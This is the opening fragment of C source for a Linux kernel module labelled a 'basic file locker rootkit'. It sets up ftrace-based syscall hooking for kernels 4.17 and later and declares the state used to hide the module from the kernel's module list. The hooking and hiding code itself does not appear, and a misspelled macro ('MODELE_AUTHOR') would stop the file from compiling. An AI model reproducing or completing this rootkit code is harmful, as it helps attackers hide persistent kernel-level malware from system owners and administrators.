#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODELE_AUTHOR("ziggoon");
MODULE_DESCRIPTION("basic file locker rootkit");
MODULE_VERSION("0.1");

// check if kernel version > 4.17.0 bc of syscall handling changes
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

// hide / reveal module
static struct list_head *prev_module;
static short hidden = 0;
